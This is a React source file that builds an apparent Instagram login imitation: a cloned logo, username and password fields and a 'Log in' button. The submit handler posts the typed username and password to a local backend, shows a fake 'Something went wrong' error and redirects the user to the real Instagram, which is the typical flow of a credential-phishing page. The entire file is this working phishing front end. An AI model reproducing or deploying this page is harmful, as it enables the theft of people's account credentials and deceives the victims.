
import './index.css';
import { useState } from 'react';

import yash from "./instainsta.png"
import axios from "axios";



const Insta = () =>{

    const [Name,setname] =  useState("");
    const [Password,setpass] =  useState("");

    function final(){


        if (Name === "") {
            alert("Username is Required")
          } else if (Password === "") {
            alert("Password is Required")
          }else{



        axios
        .post("http://localhost:3001/createProject",{
            Name,Password

        }).then((response)=>{
            setname("")
            setpass("")
            alert("Something went wrong Please try later")
       window.location.href = "https://www.instagram.com"

        }).catch((error) => {
            alert(error.response.data.message)
          });

        }
    } 
    

    return(
<div  >


<div style={{backgroundColor:"" , height:"394px" ,marginTop:"41px" ,marginLeft:"36%" , width:"376px"}}>

 <div style={{marginTop:"" ,marginLeft:"10%"}}>
          
           <img src={yash} style={{height:"70px", width:"220px", marginLeft:"35px"}} />

         <div><input style={{width:"82%" , marginTop:"32px",fontSize:"13px",padding:"11px" ,backgroundColor:"rgb(251, 248, 244)" ,borderRadius:'3px',border:"0px"}} placeholder='Phone number,username or email,address'
         value={Name} 
         onChange={(e)=>{
            setname(e.target.value)
         }} ></input></div>

         <div><input style={{width:"82%" ,padding:"11px" ,backgroundColor:"rgb(251, 248, 244)" ,borderRadius:'3px' ,marginTop:"5px" ,border:"0px"}}   placeholder="Password" 
         value={Password} 
         onChange={(e)=>{
            setpass(e.target.value)
         }}></input></div>

         <button className='yash' style={{width:"89%" ,padding:"9px", borderRadius:"8px" ,backgroundColor: "rgb(138, 213, 253)" , marginTop:"13px" ,border:"0px"
        }}
        onClick={final}
        >Log in</button>



 </div>

</div>

 
 

</div>



    )
}

export default Insta